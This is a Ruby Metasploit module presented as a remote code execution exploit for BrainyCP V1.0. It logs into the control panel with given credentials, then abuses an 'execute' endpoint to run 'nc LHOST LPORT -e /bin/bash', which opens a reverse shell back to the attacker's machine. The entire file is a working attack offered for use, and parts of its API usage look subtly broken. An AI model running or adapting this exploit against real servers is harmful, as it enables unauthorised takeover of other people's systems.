require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize
    super(
      'Name'        => 'brainycp_rce',
      'Description' => 'BrainyCP V1.0 - Remote Code Execution',
      'Author'      => 'Ahmet Ümit BAYRAM',
      'License'     => 'BSD License'
    )

    register_options(
      [
        OptString.new('URL', [true, 'The URL of the BrainyCP server']),
        OptString.new('USERNAME', [true, 'The username of an existing BrainyCP user']),
        OptString.new('PASSWORD', [true, 'The password of the given username']),
        OptString.new('LHOST', [true, 'The IP address of the attacker machine']),
        OptString.new('LPORT', [true, 'The port number of the attacker machine'])
      ]
    )

    @session = nil
  end

  def login(url, username, password)
    session = Rex::Proto::Http::Client.new(url)
    login_url = normalize_uri(url, '/auth.php')
    login_data = {'login' => username, 'password' => password, 'lan' => '/'}
    response = session.post(login_url, {'Referer' => url}, login_data)

    if response.body.include?('Sign In')
      fail_with(Failure::NoAccess, 'Invalid credentials or may the system be patched.')
      return nil
    end

    return session
  end

  def execute_command(cmd)
    cmd = Rex::Text.uri_encode(cmd)
    exec_url = normalize_uri(datastore['URL'], 'index.php')
    exec_data = {
      'do' => 'execute',
      'subdo' => 'ajax',
      'command' => cmd
    }
    response = @session.post(exec_url, {'Referer' => datastore['URL']}, exec_data)

    if response.body.include?('Fail')
      print_error("Failed to execute command: #{cmd}")
    else
      print_good("Command executed: #{cmd}")
    end
  end

  def run
    url = datastore['URL']
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    @session = login(url, username, password)

    if not @session
      return
    end

    reverse_shell = "nc #{lhost} #{lport} -e /bin/bash"
    execute_command(reverse_shell)
  end
end
